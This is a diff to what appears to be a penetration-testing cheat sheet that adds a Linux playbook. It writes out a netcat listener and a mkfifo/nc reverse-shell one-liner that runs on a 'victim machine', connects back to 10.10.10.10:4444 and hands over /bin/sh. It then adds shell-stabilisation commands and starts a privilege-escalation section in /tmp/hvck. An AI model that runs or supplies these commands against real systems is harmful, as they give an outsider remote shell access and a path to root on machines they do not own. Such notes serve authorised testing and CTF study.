@@ -1295,8 +1295,33 @@ Linux Privilege Escalation:
 > getcap -r 2>/dev/null 
  
 
-### PLAYBOOK 1
+### PLAYBOOK 1 - Linux 
+**Getting the Shell**
 
+Create Reverse Shell Listener
+```
+nc -lvnp 4444
+```
+
+From the Victim machine, this will connect to the listener
+```
+mkfifo /tmp/f; nc 10.10.10.10 4444 </tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+
+Back to the listener you must stabilize the shell 
+```
+nc -lvnp 4444
+... connected
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+`ctrl+z`
+stty raw -echo;fg 
+```
+
+
+**PRIVILIGE ESCALATION**
+> Once obtaining shell you next goal is to escalate priviliges 
 ```bash
 mkdir -p /tmp/hvck
 cd /tmp/hvck
